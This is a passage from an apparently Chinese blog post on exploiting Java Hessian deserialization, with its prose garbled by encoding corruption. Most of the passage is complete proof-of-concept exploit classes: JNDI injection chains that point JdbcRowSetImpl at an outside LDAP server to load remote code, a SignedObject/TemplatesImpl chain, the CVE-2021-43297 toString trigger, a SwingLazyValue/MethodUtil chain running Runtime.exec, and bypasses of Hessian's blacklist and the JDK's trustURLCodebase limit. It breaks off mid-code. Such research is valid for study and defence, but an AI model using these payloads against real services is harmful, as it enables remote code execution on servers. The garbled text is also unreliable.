comparatoré»˜è®¤ä¸ºnullï¼Œæ‰€ä»¥ä¼šå¯¹k1è°ƒç”¨äº†compareTo()ï¼Œå¦‚æœcomparatorï¼ˆåå°„å¯èµ‹å€¼ï¼‰ä¸ä¸ºnullï¼Œè¿˜èƒ½è°ƒç”¨comparatorçš„compare()æ–¹æ³• å› æ­¤æˆ‘ä»¬å°±è‡ªç„¶è€Œç„¶åœ°èµ°åˆ°äº†æˆ‘ä»¬è‡ªå·±é‡å†™çš„compareToæ–¹æ³• gadgetRomeæ­£å¥½å‘¢å‰æ®µæ—¶é—´åˆšå­¦å®ŒRomeååºåˆ—åŒ–ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹Ÿæ­£å¥½å¯ä»¥ç”¨ä¸Š å®é™…ä¸Šä¸€æ•´æ¡é“¾å­å’Œysoçš„å‡ ä¹æ²¡ä»€ä¹ˆåŒºåˆ« JdbcRowSetImpl.getDatabaseMetaData()Method.invoke(Object, Object...)ToStringBean.toString(String)ToStringBean.toString()ObjectBean.toString()EqualsBean.beanHashCode()HashMap.hash()HashMap.put()MapDeserializer.readMap()SerializerFactory.readMap()Hessian2Input.readObject() pocå¦‚ä¸‹ï¼š package org.example;import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import com.sun.rowset.JdbcRowSetImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.lang.reflect.Field;import java.util.Base64;import java.util.HashMap;public class Test public static void main(String[] args) throws Exception JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); String url = ldap://47.113.102.46:50389/53bee6; jdbcRowSet.setDataSourceName(url); ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowSet); EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean); HashMapObject,Object hashMap = new HashMap(); hashMap.put(aaa, 123); Field tableField = HashMap.class.getDeclaredField(table); tableField.setAccessible(true); Object[] table = (Object[]) tableField.get(hashMap); for (Object entry: table) if (entry != null) setField(entry,key,equalsBean); String s = ser(hashMap); unser(s); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static String ser(Object object) throws Exception ByteArrayOutputStream byteArrayOutputStream= new ByteArrayOutputStream(); Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream); hessian2Output.getSerializerFactory().setAllowNonSerializable(true); hessian2Output.writeObject(object); hessian2Output.flushBuffer(); return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); public static Object unser(String string) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string)); Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream); return hessian2Input.readObject(); æœ‰ä¸ªå°é—®é¢˜å°±æ˜¯ç›¸æ¯”äºysoçš„romeé“¾ï¼Œè¿™é‡Œæ²¡åŠæ³•ä½¿ç”¨TemplatesImplï¼Œä¸€å¼€å§‹æ²¡æœ‰æŠ¥é”™ä¹Ÿä¸æ¸…æ¥šé—®é¢˜å‡ºåœ¨å“ª æ‘¸ç´¢äº†ä¸€ç•ªä¹‹åçŒœæµ‹åŸå› åœ¨äº_tfactoryå±æ€§æ˜¯transientçš„ï¼Œåœ¨åŸç”Ÿååºåˆ—åŒ–ä¸­é€šè¿‡é‡å†™readObject()æ¥ç»™å…¶èµ‹å€¼ï¼Œä½†æ˜¯åœ¨hessianä¸­å¯¹äºtransientçš„å±æ€§æ˜¯æ²¡åŠæ³•ååºåˆ—åŒ–çš„ï¼Œå¹¶ä¸”åªèƒ½åœ¨readResolve()ä¸­å¯èƒ½è¿˜åŸ äºŒæ¬¡ååºåˆ—åŒ–åˆ©ç”¨java.security.SignedObjectä¸‹çš„getObject()æ–¹æ³•å®ç°åŸç”Ÿååºåˆ—åŒ– åœ¨ä½¿ç”¨JavaåŸç”Ÿçš„ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœè¢«ååºåˆ—åŒ–çš„ç±»é‡å†™äº†readObject()ï¼Œé‚£ä¹ˆJavaå°±ä¼šé€šè¿‡åå°„æ¥è°ƒç”¨é‡å†™çš„readObject() ä¸‹é¢æˆ‘ä»¬æ¥çœ‹TemplatesImplç±»çš„readObject()æ–¹æ³• private void readObject(ObjectInputStream is) throws IOException, ClassNotFoundException SecurityManager security = System.getSecurityManager(); if (security != null) String temp = SecuritySupport.getSystemProperty(DESERIALIZE_TRANSLET); if (temp == null || !(temp.length()==0 || temp.equalsIgnoreCase(true))) ErrorMsg err = new ErrorMsg(ErrorMsg.DESERIALIZE_TRANSLET_ERR); throw new UnsupportedOperationException(err.toString()); // We have to read serialized fields first. ObjectInputStream.GetField gf = is.readFields(); _name = (String)gf.get(_name, null); _bytecodes = (byte[][])gf.get(_bytecodes, null); _class = (Class[])gf.get(_class, null); _transletIndex = gf.get(_transletIndex, -1); _outputProperties = (Properties)gf.get(_outputProperties, null); _indentNumber = gf.get(_indentNumber, 0); if (is.readBoolean()) _uriResolver = (URIResolver) is.readObject(); _tfactory = new TransformerFactoryImpl(); å¯ä»¥çœ‹åˆ°è¿™é‡Œæ‰‹åŠ¨newäº†ä¸€ä¸ªTransformerFactoryImplç±»èµ‹å€¼ç»™_tfactoryï¼Œè¿™æ ·å°±è§£å†³äº†_tfactoryæ— æ³•è¢«åºåˆ—åŒ–çš„æƒ…å†µ æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥é…åˆSignedObjectç±»æ¥å®ç°ï¼Œåœ¨SignedObjectç±»çš„æ„é€ å‡½æ•°èƒ½å¤Ÿåºåˆ—åŒ–ä¸€ä¸ªç±»å¹¶ä¸”å°†å…¶å­˜å‚¨åˆ°å±æ€§contentä¸­ package org.example;import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.rowset.JdbcRowSetImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import javax.management.BadAttributeValueExpException;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.security.*;import java.util.Base64;import java.util.HashMap;public class Test public static void main(String[] args) throws Exception TemplatesImpl templatesimpl = new TemplatesImpl(); byte[] bytecodes = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); setField(templatesimpl,_name,aaa); setField(templatesimpl,_bytecodes,new byte[][] bytecodes); setField(templatesimpl, _tfactory, new TransformerFactoryImpl()); ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123); setField(badAttributeValueExpException,val,toStringBean); KeyPairGenerator keyPairGenerator; keyPairGenerator = KeyPairGenerator.getInstance(DSA); keyPairGenerator.initialize(1024); KeyPair keyPair = keyPairGenerator.genKeyPair(); PrivateKey privateKey = keyPair.getPrivate(); Signature signingEngine = Signature.getInstance(DSA); SignedObject signedObject = new SignedObject(badAttributeValueExpException,privateKey,signingEngine); ToStringBean toStringBean1 = new ToStringBean(SignedObject.class, signedObject); EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean1); HashMapObject,Object hashMap = new HashMap(); hashMap.put(aaa, 123); Field tableField = HashMap.class.getDeclaredField(table); tableField.setAccessible(true); Object[] table = (Object[]) tableField.get(hashMap); for (Object entry: table) if (entry != null) setField(entry,key,equalsBean); String s = ser(hashMap); unser(s); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static String ser(Object object) throws Exception ByteArrayOutputStream byteArrayOutputStream= new ByteArrayOutputStream(); Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream); hessian2Output.getSerializerFactory().setAllowNonSerializable(true); hessian2Output.writeObject(object); hessian2Output.flushBuffer(); return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); public static Object unser(String string) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string)); Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream); return hessian2Input.readObject(); Resinå¯¼å…¥ä¾èµ– dependency groupIdcom.caucho/groupId artifactIdresin/artifactId version4.0.63/version/dependency Apache Dubbo Hessian2 å¼‚å¸¸å¤„ç†æ—¶ååºåˆ—åŒ–ï¼ˆCVE-2021-43297ï¼‰åœ¨Hissian2Input#expect()æ–¹æ³•ä¸‹ï¼Œå­˜åœ¨è¿™ä¹ˆå‡ ç‚¹éœ€è¦æ³¨æ„çš„ 1ã€Inputåºåˆ—åŒ–æµçš„offsetåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­è‡ªå‡1 2ã€offsetè‡ªå‡1åï¼Œè°ƒç”¨readObject()è¿›è¡Œååºåˆ—åŒ– 3ã€å°†objå’Œå­—ç¬¦ä¸²è¿›è¡Œæ‹¼æ¥ï¼Œå°†è°ƒç”¨objçš„toString()æ–¹æ³• toString()èƒ½å¤Ÿå¤§å¤§å»¶ä¼¸åˆ©ç”¨é“¾ æŸ¥æ‰¾ç”¨æ³•ï¼Œé™¤äº†readObject()ä¹‹å¤–å‡ ä¹æ‰€æœ‰read**()æ–¹æ³•éƒ½æœ‰è°ƒç”¨ æŸ¥æ‰¾ç”¨æ³•èµ°åˆ°readString()æ–¹æ³•ï¼Œè¯»å–ä¸€ä¸ªå­—èŠ‚æµï¼Œç»è¿‡åˆ¤æ–­æ˜¯å¦ä¸ºä¸€äº›åŸºæœ¬ç±»å‹ä¹‹åï¼Œè‹¥éƒ½ä¸æ˜¯ï¼Œåˆ™èµ°è¿›defaultæ¥æ‰§è¡Œexpect()æŠ›å‡ºå¼‚å¸¸ public String readString() throws IOException int tag = read(); switch (tag) case N: return null; case T: return true;...... default: throw expect(string, tag); åœ¨ä¸Šé¢è·Ÿè¸ªååºåˆ—åŒ–æµç¨‹çš„æ—¶å€™ï¼Œæåˆ°è¿‡åœ¨readObjectDefinition()ä¸­è·å–ç±»ç±»å‹çš„æ—¶å€™ç¬¬ä¸€æ­¥å°±ä¼šè°ƒç”¨readString()æ–¹æ³•æ¥è·å–å¯¹è±¡çš„type åœ¨readObject()ä¸­ï¼Œå½“ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºå¤§å†™â€™Câ€™ï¼Œå¯¹åº”asciiä¸º67 å‰é¢æˆ‘ä»¬æåˆ°ï¼Œhessianæ˜¯é€šè¿‡byteæ¯ä¸€éƒ¨åˆ†çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å³tagä½œä¸ºæ ‡è¯†ç¬¦æ¥åˆ¤æ–­åç»­ä¸€éƒ¨åˆ†å­—èŠ‚æµå¯¹åº”çš„ç±»å‹ å‰é¢ä½¿ç”¨hashmapçš„æ—¶å€™Byteçš„ç¬¬ä¸€ä½ä¸º72ï¼Œå³â€™Hâ€™ï¼Œä¼šèµ°åˆ°hashmapçš„ååºåˆ—åŒ–æµç¨‹ é‡è¦çš„æ˜¯ï¼Œè¿™ä¸€éƒ¨åˆ†å­—èŠ‚æµéƒ½æ˜¯æˆ‘ä»¬å¯æ§çš„ æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•è®©tagä¸º67äº†ï¼Œå¯ä»¥é‡å†™ writeString æŒ‡å®šç¬¬ä¸€æ¬¡ read çš„ tag ä¸º 67, è¿˜å¯ä»¥ç»™åºåˆ—åŒ–å¾—åˆ°çš„bytesæ•°ç»„å‰åŠ ä¸€ä¸ª67 Poc package org.example;import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import com.sun.rowset.JdbcRowSetImpl;import com.sun.syndication.feed.impl.ToStringBean;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.lang.reflect.Field;import java.util.Base64;public class Test public static void main(String[] args) throws Exception JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); String url = ldap://47.113.102.46:50389/c8ad0f; jdbcRowSet.setDataSourceName(url); ToStringBean bean = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream); hessian2Output.writeObject(bean); hessian2Output.close(); byte[] data = byteArrayOutputStream.toByteArray(); byte[] poc = new byte[data.length + 1]; System.arraycopy(new byte[]67, 0, poc, 0, 1); System.arraycopy(data, 0, poc, 1, data.length); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(poc); Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream); System.out.println(hessian2Input.readObject()); hessian2Input.close(); Hessian-jdkåŸç”Ÿé“¾Runtimeå…¥å£ç‚¹åœ¨javax.activation.MimeTypeParameterListçš„toString()ï¼Œè°ƒç”¨äº†parametersçš„getæ–¹æ³•ï¼Œè€Œè¿™é‡Œçš„parametersæ–¹æ³•æ˜¯ä¸€ä¸ªHashTable æŸ¥ä¸€ä¸‹HashTableçš„å­ç±»ï¼Œçœ‹çœ‹å“ªä¸ªæ˜¯æœ‰getæ–¹æ³•çš„ ç»“æœåªæœ‰UIDefaultsæœ‰get()æ–¹æ³•ï¼Œå¹¶åœ¨å…¶ä¸­è°ƒç”¨äº†getFromHashtable()ï¼Œä¼ å…¥çš„keyå¯æ§ åœ¨getFromHashtable()ä¸­ï¼Œvalueä»hashtableä¸­é€šè¿‡keyè·å–ï¼ŒLazyVlueæ˜¯ä¸€ä¸ªæ¥å£ï¼Œè‹¥valueæ˜¯LazyValueçš„å­ç±»ï¼Œè°ƒç”¨valueçš„createValue()æ–¹æ³• ä¾æ¬¡æ‰¾ä¸€æ‰¾LazyValueå®ç°ç±»çš„createValue() åœ¨LazyPainterä¸‹çš„createValue()ä¸­æœ‰ç±»åŠ è½½å’Œç±»å®ä¾‹åŒ–ï¼Œå‰é¢è®²åˆ°CCé“¾çš„æ—¶å€™æåˆ°TrAXFilterçš„æ„é€ å™¨ä¸‹è°ƒç”¨äº†Templatesçš„newTransformer()æ–¹æ³•å®ç°æ”»å‡» ä½†æ˜¯å®šç›ä¸€çœ‹ï¼Œ1332è¡ŒæŒ‡å®šäº†æ„é€ å™¨çš„å‚æ•°ï¼Œå’Œæˆ‘ä»¬æƒ³è¦çš„çš„TrAXFilterå®Œå…¨ä¸åŒï¼Œèµ°ä¸é€šï¼Œç»§ç»­çœ‹çœ‹ è¿˜æœ‰ä¸€ä¸ªå®ç°ç±»SwingLazyValueï¼Œçœ‹çœ‹å®ƒçš„createValue()æ–¹æ³• ä»è¯¥æ–¹æ³•çš„å…·ä½“å†…å®¹ä¸­æˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™é‡Œåªèƒ½è°ƒç”¨ä»»æ„çš„é™æ€æ–¹æ³•ï¼Œä¸èƒ½å¤Ÿè°ƒç”¨å®ä¾‹æ–¹æ³• ä½†æ˜¯å˜ï¼Œä¸‹é¢é€šè¿‡æ„é€ å‡½æ•°ä»»æ„å®ä¾‹åŒ–å¯¹è±¡åˆ°å€’æ˜¯äº†æˆ‘ä»¬å¦‚ä½•åˆ©ç”¨TrAXFilteræä¾›äº†ä¸€ä¸ªæ€è·¯ çœ‹ä¸€ä¸‹SwingLazyValueçš„æ„é€ å‡½æ•° å›é¡¾ä¸€ä¸‹åˆ©ç”¨æµç¨‹ï¼š javax.activation.MimeTypeParameterList.toString()\tjavax.swing.UIDefaults.get(Object) javax.swing.UIDefaults.getFromHashtable(Object) SwingLazyValue.createValue(UIDefaults) åˆæ­¥æ„é€ ä¸€ä¸‹ Object[] arg = new Object[]getTemplates();MimeTypeParameterList mimeTypeParameterList = createObjWithoutConstructor(MimeTypeParameterList.class);UIDefaults defaults = new UIDefaults();SwingLazyValue swingLazyValue = new SwingLazyValue(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter,null,arg);defaults.put(666,swingLazyValue);setField(mimeTypeParameterList,parameters,defaults);System.out.println(mimeTypeParameterList); ä½†æ˜¯æ˜¯èƒ½èµ°åˆ°createValue()ä¸­çš„ï¼Œå½“æ­¥è¿‡è·å–æ„é€ å‡½æ•°çš„ä¸€è¡Œçš„æ—¶å€™æŠ›å‡ºå¼‚å¸¸ è§‚å¯ŸclassNameç­‰å‡æ²¡é—®é¢˜ï¼Œæ„Ÿè§‰é—®é¢˜æ˜¯å‡ºåœ¨getClassArray()çš„è¿”å›å€¼ï¼Œè·Ÿè¿›å»çœ‹çœ‹ï¼Œæœ€åé€šè¿‡getClass()æ¥è·å–TemplatesImplçš„classçš„ ä½†æ˜¯æˆ‘ä»¬å»çœ‹çœ‹TrAXFilterçš„æ„é€ å‡½æ•°ï¼Œå‚æ•°æ˜¯æ¥å£Templatesè€Œå¹¶éTemplatesImplï¼Œæ‰€ä»¥åœ¨getConstructor()çš„æ—¶å€™ä¼šå‡ºé”™ ç›®å‰ä¸çŸ¥å¦‚ä½•è§£å†³ï¼Œæ‰€ä»¥è½¬æ¢ä¸€ä¸‹æ€è·¯ï¼Œçœ‹çœ‹é™æ€æ–¹æ³•è°ƒç”¨å¦‚ä½•èƒ½å¤Ÿå¦‚ä½•åˆ©ç”¨ MethodUtilçš„invokeæ–¹æ³•å¯ä»¥è°ƒç”¨ä»»æ„å¯¹è±¡çš„æ–¹æ³•ï¼ˆè¿™é‡ŒæŒ‡çš„æ˜¯è¯¥ç±»ä¸­çš„staticçš„invokeæ–¹æ³•ï¼‰ ç›´æ¥ä½¿ç”¨çš„è¯æ–¹æ³•å¦‚ä¸‹ MethodUtil.invoke(Runtime.class.getDeclaredMethod(exec, String.class),Runtime.getRuntime(),new Object[]calc); ä½†æ˜¯å¦‚æœåœ¨SwingLazyValue()æ„é€ å‡½æ•°ä¸­ä¼  å¾ˆå®¹æ˜“å‘ç°ï¼ŒRuntime.getRuntime()åœ¨è¿›å…¥SwingLazyValue.createValue()ä¹‹åä¼šè·å–å…¶ç±»Runtime.class SwingLazyValue swingLazyValue = new SwingLazyValue(sun.reflect.misc.MethodUtil,invoke,new Object[]Runtime.class.getDeclaredMethod(exec, String[].class),Runtime.getRuntime(),new Object[]calc); ä½†æ˜¯MethodUtil.invoke()çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯Objectè€Œä¸æ˜¯Runtimeï¼Œå› æ­¤Methodä¼šè·å–å¤±è´¥ æ‰€ä»¥è¿™é‡Œè¦åšä¸€ä¸ªç®€å•çš„å˜é€šï¼ŒäºŒæ¬¡è°ƒç”¨MethodUtil.invoke()ï¼Œå› ä¸ºMethodUtil.invoke()æ˜¯é™æ€æ–¹æ³•ï¼Œæ‰€ä»¥äºŒæ¬¡è°ƒç”¨ä¸­ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥æ˜¯ä»»æ„çš„å€¼ ä¸ºäº†ç¬¦åˆSwingLazyValue.createValue()ä¸­è·å–Methodçš„typeï¼Œæˆ‘ä»¬è®©å®ƒæ˜¯Objectå¯¹è±¡ Method invokeMethod = MethodUtil.class.getMethod(invoke, Method.class, Object.class, Object[].class);Method execMethod = Runtime.class.getDeclaredMethod(exec, String.class);MethodUtil.invoke(invokeMethod,new Object(),new Object[]execMethod,Runtime.getRuntime(),new Object[]calc); æ­£å‘æ„é€ ä¸€ä¸‹pocå¹¶ç”¨println()è§¦å‘toString()ï¼š Method invokeMethod = MethodUtil.class.getMethod(invoke, Method.class, Object.class, Object[].class); Method execMethod = Runtime.class.getDeclaredMethod(exec, String.class);// MethodUtil.invoke(invokeMethod,new Object(),new Object[]execMethod,Runtime.getRuntime(),new Object[]calc); MimeTypeParameterList mimeTypeParameterList = createObjWithoutConstructor(MimeTypeParameterList.class); UIDefaults defaults = new UIDefaults(); SwingLazyValue swingLazyValue = new SwingLazyValue(sun.reflect.misc.MethodUtil,invoke,new Object[]invokeMethod,new Object(),new Object[]execMethod,Runtime.getRuntime(),new Object[]calc); defaults.put(666,swingLazyValue); setField(mimeTypeParameterList,parameters,defaults); System.out.println(mimeTypeParameterList); æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¦æ€è€ƒååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¦‚ä½•è§¦å‘toString()æ–¹æ³•äº† å¾ˆç®€å•ï¼Œåˆ©ç”¨ä¸Šé¢åˆšåˆšå­¦è¿‡çš„å¼‚å¸¸å¤„ç†æ—¶ååºåˆ—åŒ–ï¼Œåœ¨åºåˆ—åŒ–åçš„å­—èŠ‚ç»„å‰é¢å†æ·»åŠ ä¸€ä¸ªâ€™67â€™å°±å¯ä»¥å•¦ Poc package org.example;import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import sun.reflect.ReflectionFactory;import sun.reflect.misc.MethodUtil;import sun.swing.SwingLazyValue;import javax.activation.MimeTypeParameterList;import javax.swing.*;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.*;public class Test public static void main(String[] args) throws Exception Method invokeMethod = MethodUtil.class.getMethod(invoke, Method.class, Object.class, Object[].class); Method execMethod = Runtime.class.getDeclaredMethod(exec, String.class);// MethodUtil.invoke(invokeMethod,new Object(),new Object[]execMethod,Runtime.getRuntime(),new Object[]calc); MimeTypeParameterList mimeTypeParameterList = createObjWithoutConstructor(MimeTypeParameterList.class); UIDefaults defaults = new UIDefaults(); SwingLazyValue swingLazyValue = new SwingLazyValue(sun.reflect.misc.MethodUtil,invoke,new Object[]invokeMethod,new Object(),new Object[]execMethod,Runtime.getRuntime(),new Object[]calc); defaults.put(666,swingLazyValue); setField(mimeTypeParameterList,parameters,defaults);// System.out.println(mimeTypeParameterList); String s = ser(mimeTypeParameterList); System.out.println(s); unser(s); public static Object unser(String string) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string)); Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream); Object obj = hessian2Input.readObject(); return obj; public static String ser(Object object) throws Exception ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream); hessian2Output.getSerializerFactory().setAllowNonSerializable(true); byteArrayOutputStream.write(67); hessian2Output.writeObject(object); hessian2Output.flushBuffer(); return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static T T createObjWithoutConstructor(ClassT clazz) throws Exception ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); ConstructorObject constructor = Object.class.getDeclaredConstructor(); Constructor? constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor); constructor1.setAccessible(true); return (T) constructor1.newInstance(); ç”¨ä¸Šè¿°pocçš„è¯hessianç‰ˆæœ¬éœ€è¦åœ¨4.0.60ä»¥ä¸‹ è¦æ˜¯é‡åˆ°ä¸€äº›å¥‡æ€ªçš„æŠ¥é”™å¯çœ‹çœ‹è¯¥æ–‡ç« æ‰¾ä¸ªåŸå› ï¼šhttps://blog.potatowo.top/2024/11/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHessian hessiané«˜ç‰ˆæœ¬ç»•è¿‡hessian4.0.60 åœ¨ä¸Šé¢åˆ†æååºåˆ—åŒ–è¿‡ç¨‹ä¸­æˆ‘ä»¬ç”¨çš„hessianç‰ˆæœ¬å°±æ˜¯å¤§äº4.0.60çš„ï¼Œåœ¨è¿™è¿‡ç¨‹ä¸­æœ‰ä¸ªå‡½æ•°isAllow()ï¼Œåœ¨ä½ç‰ˆæœ¬é‡Œé¢åªæœ‰ä¸€ä¸ªç™½åå•ï¼Œå¹¶ä¸”å…¶ä¸­è¿˜æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥åŸºæœ¬æ²¡ä»€ä¹ˆç”¨å¤„ åœ¨é«˜ç‰ˆæœ¬é‡Œé¢å¢åŠ äº†ä¸€ä¸ªé»‘åå•çš„åˆ¤æ–­ï¼Œå¹¶ä¸”æ˜¯ç¦äº†Runtimeçš„ ä½†æ˜¯JdbcRowSetImpl.getDatabaseMetaData()å¯¼è‡´çš„jndiæ³¨å…¥ï¼Œå¹¶æ²¡æœ‰åœ¨é»‘åå•ä¸­ Method invokeMethod = MethodUtil.class.getMethod(invoke, Method.class, Object.class, Object[].class);// Method execMethod = Runtime.class.getDeclaredMethod(exec, String.class); Method jndiMethod = JdbcRowSetImpl.class.getMethod(getDatabaseMetaData); Field field = BaseRowSet.class.getDeclaredField(dataSource); field.setAccessible(true); JdbcRowSetImpl jdbcRowSet = createObjWithoutConstructor(JdbcRowSetImpl.class); field.set(jdbcRowSet,ldap://127.0.0.1:8085/evil);// jdbcRowSet.getDatabaseMetaData(); MimeTypeParameterList mimeTypeParameterList = createObjWithoutConstructor(MimeTypeParameterList.class); UIDefaults defaults = new UIDefaults(); SwingLazyValue swingLazyValue = new SwingLazyValue(sun.reflect.misc.MethodUtil,invoke,new Object[]invokeMethod,new Object(),new Object[]jndiMethod,jdbcRowSet,new Object[]); defaults.put(666,swingLazyValue); setField(mimeTypeParameterList,parameters,defaults);// System.out.println(mimeTypeParameterList); String s = ser(mimeTypeParameterList); unser(s); åœ¨jdkä½ç‰ˆæœ¬ï¼Œhessiané«˜ç‰ˆæœ¬æƒ…å†µä¸‹æˆåŠŸå¼¹çª— JNDIç»•è¿‡jdké«˜ç‰ˆæœ¬trustURLCodebaseé™åˆ¶åœ¨å‰é¢å­¦ä¹ jndiæ³¨å…¥çš„æ—¶å€™è¿˜è¦å­¦åˆ°ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯åˆ©ç”¨System.setProperty()æ–¹æ³•æ¥ä¿®æ”¹ç³»ç»Ÿå˜é‡ï¼Œä¹ä¸€çœ‹Systemå¥½åƒåœ¨å‰é¢Hessiané«˜ç‰ˆæœ¬çš„é»‘åå•ä¸­ï¼Œä½†æ˜¯å®é™…ä¸Šåºåˆ—åŒ–çš„å¹¶ä¸æ˜¯Systemå¯¹è±¡ï¼Œè€Œæ˜¯setProperty()æ–¹æ³•çš„Methodå¯¹è±¡ï¼Œæ‰€ä»¥åœ¨Hessiané«˜ç‰ˆæœ¬ä¾æ—§è¡Œå¾—é€š å›åˆ°ä¸Šé¢ï¼Œè§‚å¯Ÿjavax.activation.MimeTypeParameterListçš„toString()çš„ä»£ç ï¼Œå¾ˆå®¹æ˜“çœ‹å‡ºå¯¹UIDefaultsè¿›è¡Œé”®å€¼å¯¹çš„éå† å› æ­¤èƒ½å¤Ÿåœ¨è§¦å‘payloadçš„valueä¹‹å‰ï¼Œputä¸€ä¸ªè°ƒç”¨setProperty()æ–¹æ³•çš„value ä½†æ˜¯çªç„¶æƒ³åˆ°ä¸€ä¸ªé—®é¢˜ è°ƒç”¨setProperty()ä¹‹åï¼Œç¬¬ä¸€ä¸ªé”®å€¼å¯¹å®Œæˆäº†ä»–çš„ä½¿å‘½ï¼Œjavaç¨‹åºæŠ›å‡ºäº†å¼‚å¸¸ ç›´æ¥å†™çš„è¯ç¨‹åºæ— æ³•ç»§ç»­æ‰§è¡Œä¸‹å»ï¼Œä»£ç è›®å†™ä¸€ä¸‹ï¼š Method invokeMethod = MethodUtil.class.getMethod(invoke, Method.class, Object.class, Object[].class);// Method execMethod = Runtime.class.getDeclaredMethod(exec, String.class); Method jndiMethod = JdbcRowSetImpl.class.getMethod(getDatabaseMetaData); Method setPropertyMethod = System.class.getDeclaredMethod(setProperty, String.class, String.class); MimeTypeParameterList mimeTypeParameterList0 = createObjWithoutConstructor(MimeTypeParameterList.class); SwingLazyValue swingLazyValue0 = new SwingLazyValue(sun.reflect.misc.MethodUtil,invoke,new Object[]invokeMethod,new Object(),new Object[]setPropertyMethod,new Object(),new Object[]com.sun.jndi.ldap.object.trustURLCodebase,true);// System.setProperty(com.sun.jndi.ldap.object.trustURLCodebase,true); Field field = BaseRowSet.class.getDeclaredField(dataSource); field.setAccessible(true); JdbcRowSetImpl jdbcRowSet = createObjWithoutConstructor(JdbcRowSetImpl.class); field.set(jdbcRowSet,ldap://127.0.0.1:8085/evil);// jdbcRowSet.getDatabaseMetaData(); MimeTypeParameterList mimeTypeParameterList = createObjWithoutConstructor(MimeTypeParameterList.class); UIDefaults defaults = new UIDefaults(); SwingLazyValue swingLazyValue = new SwingLazyValue(sun.reflect.misc.MethodUtil,invoke,new Object[]invokeMethod,new Object(),new Object[]jndiMethod,jdbcRowSet,new Object[]); defaults.put(777,swingLazyValue0); defaults.put(1,swingLazyValue); setField(mimeTypeParameterList,parameters,defaults);// System.out.println(mimeTypeParameterList); String s = ser(mimeTypeParameterList); unser(s); è‹¥æ˜¯ç”¨tryç»“æ„åˆ™å¯ä»¥è§¦å‘ï¼ŒæŠ›å‡ºå¼‚å¸¸è¿›å…¥catchä¸­ Method invokeMethod = MethodUtil.class.getMethod(invoke, Method.class, Object.class, Object[].class);// Method execMethod = Runtime.class.getDeclaredMethod(exec, String.class); Method jndiMethod = JdbcRowSetImpl.class.getMethod(getDatabaseMetaData); Method setPropertyMethod = System.class.getDeclaredMethod(setProperty, String.class, String.class); MimeTypeParameterList mimeTypeParameterList0 = 